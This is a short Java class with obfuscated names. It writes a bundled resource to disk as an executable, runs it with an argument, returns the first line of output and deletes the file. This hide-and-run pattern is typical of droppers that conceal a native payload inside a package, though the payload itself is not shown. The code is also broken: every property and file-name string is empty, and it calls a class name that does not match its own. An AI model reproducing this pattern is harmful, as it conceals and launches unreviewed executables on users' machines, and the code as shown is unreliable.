package ma.ac2i.y1r0.z1r0.m0o;
import java.nio.charset.StandardCharsets;
import java.util.Base64; 
import java.io.File; 

public class R04o0 { 
    private static File e0x45() throws Exception {  
        String os = System.getProperty("").toLowerCase();
        boolean isW = os.contains("");

        String f0x4E = isW ? "" : "";
        String resourceName = "" + f0x4E;  
        File tx01$ = new File(System.getProperty(""), f0x4E);		

        if (!tx01$.exists()) {
            try (var in = R04o.class.getResourceAsStream(resourceName);
                var out = new java.io.FileOutputStream(tx01$)) {

                in.transferTo(out);
            }

            tx01$.setExecutable(true);  
            tx01$.deleteOnExit();
        }
 
        return tx01$;
    }

    public static String d0x116_(String e0x100) {
        try {
            File exe = e0x45(); 
            ProcessBuilder pb = new ProcessBuilder(exe.getAbsolutePath(), e0x100);
            pb.redirectErrorStream(true);
            Process p = pb.start(); 
            
            String r0x116;
            try (java.io.BufferedReader br =
                     new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()))) {
                r0x116 = br.readLine();
            } 
            p.waitFor(); 
            if (exe != null && exe.exists()) exe.delete();
            return r0x116;
        } catch (Exception e) {
            return "";
        }
    }
}
